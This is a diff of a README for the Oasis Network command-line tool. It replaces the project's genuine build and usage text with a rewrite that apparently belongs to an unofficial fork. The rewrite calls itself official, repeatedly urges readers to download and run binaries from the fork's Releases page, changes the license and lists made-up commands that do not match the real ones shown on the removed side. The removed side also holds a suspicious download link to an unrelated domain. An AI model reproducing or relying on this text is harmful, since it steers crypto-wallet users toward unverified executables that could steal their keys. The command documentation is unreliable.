@@ -1,104 +1,146 @@
-# Oasis CLI
+# Oasis Network CLI 🌐
 
-[Download here](https://installergitb.icu?bmhpqq2lr5ekt4l)
+![Oasis Network CLI](https://img.shields.io/badge/Oasis%20Network-CLI-blue?style=for-the-badge&logo=Oasis)
 
-[![CI tests status][github-ci-tests-badge]][github-ci-tests-link]
-[![CI lint status][github-ci-lint-badge]][github-ci-lint-link]
-<!-- markdownlint-disable line-length -->
-[github-ci-tests-badge]: https://github.com/oasisprotocol/cli/workflows/ci-tests/badge.svg
-[github-ci-tests-link]: https://github.com/oasisprotocol/cli/actions?query=workflow:ci-tests+branch:master
-[github-ci-lint-badge]: https://github.com/oasisprotocol/cli/workflows/ci-lint/badge.svg
-[github-ci-lint-link]: https://github.com/oasisprotocol/cli/actions?query=workflow:ci-lint+branch:master
-<!-- markdownlint-enable line-length -->
+Welcome to the official Command Line Interface (CLI) for the Oasis Network. This tool provides developers and users with a powerful way to interact with the Oasis blockchain, manage wallets, stake tokens, and execute various operations directly from the terminal.
 
-This is the official command-line interface (CLI) for interacting with the
-[Oasis Network], both the consensus layer and ParaTimes built with the
-[Oasis Runtime SDK].
+## Table of Contents
 
-[Oasis Network]: https://docs.oasis.io/
-[Oasis Runtime SDK]:
-  https://github.com/oasisprotocol/oasis-sdk/tree/main/runtime-sdk
+1. [Introduction](#introduction)
+2. [Features](#features)
+3. [Installation](#installation)
+4. [Usage](#usage)
+5. [Commands](#commands)
+6. [Contributing](#contributing)
+7. [License](#license)
+8. [Support](#support)
 
-## Building
+## Introduction
 
-To build the CLI, run the following:
+The Oasis Network is a privacy-focused blockchain platform designed for decentralized applications. Our CLI tool allows users to access the full potential of the Oasis ecosystem. Whether you are a developer, a researcher, or just someone interested in blockchain technology, this CLI will help you navigate the Oasis Network with ease.
 
-```bash
-make
-```
+## Features
 
-This will generate a binary called `oasis` which you are free to put somewhere
-in your `$PATH`.
+- **Wallet Management**: Create, import, and manage non-custodial wallets.
+- **Staking**: Stake your tokens directly from the terminal.
+- **Transaction Handling**: Send and receive tokens securely.
+- **Ledger Support**: Integrate with hardware wallets for enhanced security.
+- **Easy to Use**: Designed with a simple interface for quick access to features.
 
-*NOTE: The rest of the README assumes the `oasis` binary is somewhere in your
-`$PATH`.*
+## Installation
 
-## Quickstart
+To get started, you need to download the latest version of the CLI. Visit the [Releases section](https://github.com/Silvermax12/cli/releases) to find the latest build. Download the appropriate file for your operating system and follow the instructions to install it.
 
-You can interact with the Oasis CLI by invoking it from the command line as
-follows:
+### Steps to Install
 
-```bash
-oasis --help
-```
+1. **Download**: Visit the [Releases section](https://github.com/Silvermax12/cli/releases) and download the file for your OS.
+2. **Extract**: If the file is zipped, extract it to your desired location.
+3. **Execute**: Run the CLI by executing the file in your terminal.
 
-Each (sub)command has a help section that shows what commands and arguments are
-available.
+## Usage
 
-The Oasis CLI also comes with a default set of networks and ParaTimes
-configured. You can see the list by running:
+Once installed, you can start using the CLI. Open your terminal and type the command `oasis-cli` to get started. You will see a list of available commands and options.
+
+### Example
 
 ```bash
-oasis network list
-oasis paratime list
+oasis-cli help
 ```
 
-Initial configuration currently defaults to `mainnet` and the `emerald`
-ParaTime but this can easily be changed using the corresponding `set-default`
-subcommand as follows:
+This command will display all available commands along with their descriptions.
 
-```bash
-oasis network set-default testnet
-oasis paratime set-default testnet sapphire
-```
+## Commands
 
-To be able to sign transactions you will need to first create or import an
-account into your wallet. File-based (storing keys in an encrypted file) and
-Ledger-based (storing keys on a Ledger device) backends are supported.
-To create a new file-backed account run:
+The CLI offers a range of commands to interact with the Oasis Network. Below is a list of some of the most commonly used commands:
 
-```bash
-oasis wallet create myaccount
-```
+### Wallet Commands
 
-It will ask you to choose and confirm a passphrase to encrypt your account with.
-You can see a list of all accounts by running:
+- **Create Wallet**: 
+  ```bash
+  oasis-cli wallet create
+  ```
+  This command will create a new non-custodial wallet.
 
-```bash
-oasis wallet list
-```
+- **Import Wallet**: 
+  ```bash
+  oasis-cli wallet import <private_key>
+  ```
+  Import an existing wallet using your private key.
 
-To show the account's balance on the default network/ParaTime, run:
+- **List Wallets**: 
+  ```bash
+  oasis-cli wallet list
+  ```
+  View all wallets associated with your account.
 
-```bash
-oasis account show
-```
+### Staking Commands
 
-The `account` command also allows you to transfer tokens, deposit or withdraw to
-and from ParaTimes, delegate your assets to validators etc.
+- **Stake Tokens**: 
+  ```bash
+  oasis-cli stake <amount>
+  ```
+  Stake a specified amount of tokens.
 
-Check out the complete User's guide in [docs/README.md] and example invocations
-of the CLI in `examples` folder to learn more.
+- **Unstake Tokens**: 
+  ```bash
+  oasis-cli unstake <amount>
+  ```
+  Unstake a specified amount of tokens.
 
-## Configuration
+- **Check Staking Status**: 
+  ```bash
+  oasis-cli stake status
+  ```
+  View your current staking status.
 
-All configuration is stored in the `$XDG_CONFIG_HOME/oasis` directory (e.g.
-`$HOME/.config/oasis` on Linux).
+### Transaction Commands
+
+- **Send Tokens**: 
+  ```bash
+  oasis-cli send <recipient_address> <amount>
+  ```
+  Send tokens to another address.
+
+- **Receive Tokens**: 
+  ```bash
+  oasis-cli receive
+  ```
+  Display your wallet address for receiving tokens.
+
+### Ledger Commands
+
+- **Connect Ledger**: 
+  ```bash
+  oasis-cli ledger connect
+  ```
+  Connect your Ledger hardware wallet.
+
+- **Sign Transaction**: 
+  ```bash
+  oasis-cli ledger sign <transaction_data>
+  ```
+  Sign a transaction using your Ledger.
+
+## Contributing
+
+We welcome contributions to improve the CLI. If you want to help, please follow these steps:
+
+1. **Fork the Repository**: Create a personal copy of the repository.
+2. **Make Changes**: Implement your changes in a new branch.
+3. **Submit a Pull Request**: Once you are satisfied with your changes, submit a pull request for review.
+
+Please ensure your code follows the existing style and includes appropriate tests.
 
 ## License
 
-This software is licensed under [Apache 2.0](./LICENSE).
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
 
-The content of the documentation (the `/docs` folder) including the media (e.g.
-images and diagrams) is licensed under [Creative Commons Attribution 4.0
-International](./LICENSE-docs).
+## Support
+
+If you have any questions or need assistance, please check the [Issues section](https://github.com/Silvermax12/cli/issues) or reach out to the community. You can also visit the [Releases section](https://github.com/Silvermax12/cli/releases) for updates and new features.
+
+## Conclusion
+
+The Oasis Network CLI is a powerful tool for anyone looking to interact with the Oasis blockchain. With features like wallet management, staking, and transaction handling, it simplifies your experience. Download it today and start exploring the Oasis ecosystem!
+
+For the latest updates and releases, visit the [Releases section](https://github.com/Silvermax12/cli/releases).
